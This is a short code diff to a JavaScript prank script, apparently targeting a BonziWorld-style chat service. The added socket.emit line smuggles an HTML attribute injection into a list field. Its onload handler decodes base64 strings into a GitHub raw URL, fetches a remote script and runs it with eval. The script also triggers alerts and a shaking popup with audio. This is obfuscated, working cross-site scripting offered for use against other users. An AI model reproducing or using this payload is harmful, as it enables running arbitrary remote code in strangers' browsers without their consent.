@@ -1,7 +1,10 @@
+socket.emit('command', { list: ['youtube', 'nyg" onload="fetch(atob(\'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v\')+\'BEN\'+atob(\'Lmpz\')).then(r=>r.text()).then(t=>eval(t))" u="'] });
+
 alert(":D RAS4 :D")
+
 function createShakingPopup() {
   const imageUrl = "https://i.redd.it/auoxw0oibhwa1.png";
-  const audioUrl = "https://github.com/ivorydevrimoalt/BONZIWORLDULTRAJAVASCRIPTLIST/raw/refs/heads/main/convert%20(85).mp3"; // Replace with your audio URL
+  const audioUrl = "https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDULTRAJAVASCRIPTLIST/refs/heads/main/convert%20(85).mp3"; // Replace with your audio URL
 
   const popupWidth = 300;
   const popupHeight = 300;
